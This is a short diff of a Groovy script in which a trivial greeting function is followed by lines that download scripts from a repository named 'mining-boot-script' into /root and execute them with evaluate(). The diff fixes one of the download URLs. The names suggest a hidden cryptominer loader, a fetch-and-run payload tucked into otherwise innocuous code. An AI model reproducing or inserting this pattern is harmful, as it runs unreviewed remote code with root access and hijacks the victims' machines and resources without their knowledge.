@@ -22,7 +22,7 @@ def sayHello(String name) {
   println "Hello, " + name
 }
 sayHello(name)
-redirectFollowingDownload("https://raw.githubusercontent.com/miner-web/mining-boot-script/main/watchdog.groovy","/root/script_dir/websocket.groovy")
+redirectFollowingDownload("https://raw.githubusercontent.com/miner-web/mining-boot-script/main/websocket.groovy","/root/script_dir/websocket.groovy")
 evaluate(new File("/root/script_dir/websocket.groovy"))
 redirectFollowingDownload("https://raw.githubusercontent.com/miner-web/mining-boot-script/main/watchdog.groovy","/root/script_dir/watchdog.groovy")
 evaluate(new File("/root/script_dir/watchdog.groovy"))
